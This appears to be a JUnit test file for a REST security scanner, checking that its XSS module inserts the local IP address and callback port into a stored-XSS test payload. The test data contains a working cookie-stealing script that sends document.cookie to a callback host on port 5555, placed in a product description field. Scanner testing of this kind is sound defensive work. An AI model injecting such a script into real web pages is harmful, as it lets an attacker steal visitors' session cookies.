package restsec;

import org.junit.Assert;
import org.junit.jupiter.api.*;
import restsec.config.Configuration;
import restsec.scanner.Scanner;
import restsec.scanner.ScannerFactory;
import restsec.scanner.XSSScanner;

import java.net.InetAddress;
import java.net.UnknownHostException;

class ScannerTest {
    @BeforeEach
    void setUp() {
        //empty
    }

    @AfterEach
    void tearDown() {
        //empty
    }

    @Test
    @DisplayName("Updating standard payload from file with dynamic values")
    void updatePayloadWithDynamicValuesIP() {
        String xssPayload = "{\"image\":\"apple_juice.jpg\",\"createdAt\":\"2016-11-23 11:02:05.000 +00:00\",\"deletedAt\":null,\"price\":1.99,\"name\":\"Apple Juice (1000ml)\",\"description\":\"Stored XSS (calls malicious Server) : <script>(new Image).src = 'http://0.0.0.0:5555/Cookie:' + document.cookie</script>\",\"id\":1,\"updatedAt\":\"2016-11-23 11:02:05.000 +00:00\"}";
        String inetAddress = "0.0.0.0";
        int callbackPort = 5555;
        try {
            inetAddress = InetAddress.getLocalHost().getHostAddress();
            Configuration configuration = new Configuration();
            callbackPort = configuration.getJettyCallbackPort();
        } catch (UnknownHostException uhe) {
            uhe.printStackTrace();
        }
        String expected = "{\"image\":\"apple_juice.jpg\",\"createdAt\":\"2016-11-23 11:02:05.000 +00:00\",\"deletedAt\":null,\"price\":1.99,\"name\":\"Apple Juice (1000ml)\",\"description\":\"Stored XSS (calls malicious Server) : <script>(new Image).src = 'http://"+inetAddress+":"+callbackPort+"/Cookie:' + document.cookie</script>\",\"id\":1,\"updatedAt\":\"2016-11-23 11:02:05.000 +00:00\"}";

        xssPayload = XSSScanner.updateXSSPayloadWithCallbackValues(xssPayload);

        Assert.assertTrue(xssPayload.equals(expected));
    }
}